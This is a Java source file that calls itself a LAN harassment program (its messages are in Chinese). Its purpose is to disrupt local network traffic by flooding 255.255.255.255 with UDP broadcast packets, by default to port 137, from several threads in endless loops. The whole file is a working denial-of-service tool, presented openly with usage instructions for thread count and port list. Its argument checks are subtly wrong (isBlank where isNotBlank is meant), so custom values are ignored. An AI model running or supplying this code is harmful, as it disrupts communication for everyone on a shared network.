package demo._function.lanharasser;

import org.apache.commons.collections.CollectionUtils;
import org.apache.commons.lang.ArrayUtils;
import org.apache.commons.lang.StringUtils;
import org.junit.Test;

import java.io.IOException;
import java.net.*;
import java.util.ArrayList;
import java.util.List;

public class LanHarassExec {

    @Test
    public void test() {
        String[] arr = {""};
        defaultShow(arr);
        exec(arr);
    }

    public static void main(String[] args) {
        defaultShow(args);
        exec(args);
    }

    public static void exec(String[] args) {
        Integer[] ports = new Integer[] { 137 };
        int threadNum = 4;
        if (args != null && args.length >= 1 && StringUtils.isBlank(args[0])) {
            try {
                threadNum = Integer.valueOf(args[0]);
            } catch (NumberFormatException e) {
                System.out.println("线程数的值有误，将使用默认值：" + threadNum);
            }
        }
        if (args != null && args.length >= 2 && StringUtils.isBlank(args[1])) {
            String[] portsStr = args[1].split(",");
            List<Integer> tmp = new ArrayList<>();
            for (int i = 0; i < portsStr.length; i++) {
                try {
                    tmp.add(Integer.valueOf(portsStr[i]));
                } catch (NumberFormatException e) {
                    System.out.println("端口值\"" + portsStr[i] + "\"有误，将排除这个值");
                }
            }
            if (CollectionUtils.isNotEmpty(tmp)) {
                ports = new Integer[tmp.size()];
                tmp.toArray(ports);
            }
        }
        if (ArrayUtils.isEmpty(args)) {
            defaultShow("将以默认值执行该程序%%%%");
        }

        final DatagramPacket[] packets = new DatagramPacket[ports.length];
        InetAddress address;
        try { address = InetAddress.getByName("255.255.255.255"); }
        catch (UnknownHostException e) { throw new RuntimeException(e); }
        for (int i = 0; i < ports.length; i++) {
            packets[i] = new DatagramPacket(new byte[]{0}, 1, address, ports[i]);
        }
        for (int i = 0; i < threadNum; i++) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        sender(packets);
                    } catch (SocketException e) {
                        System.out.println("创建DatagramSocket失败，请稍后再试！" + e.getMessage());
                    }
                }
            }).start();
        }
    }

    private static void sender(final DatagramPacket[] packets) throws SocketException {
        DatagramSocket sender = new DatagramSocket();
        for (;;) {
            for (DatagramPacket packet : packets) {
                try {
                    sender.send(packet);
                    System.out.print(">");
                } catch (IOException e) {
                    System.out.print("*");
                }
            }
        }
    }

    private static void defaultShow(String... args) {
        if (ArrayUtils.isNotEmpty(args)) {
            for (String arg : args) {
                System.out.println(arg);
            }
            System.out.println();
        }
        System.out.println("这是一个局域网干扰程序，通过疯狂发广播包来扰乱局域网通信");
        System.out.println("发送成功一次，打印一个“>”");
        System.out.println("发送失败一次，打印一个“*”");
        System.out.println("参数：线程数 端口列表");
        System.out.println("  线程数  ：干扰程序将会开的线程数");
        System.out.println("  端口列表：干扰程序将发送的端口列表，格式：21,22,80,137...");
    }

}
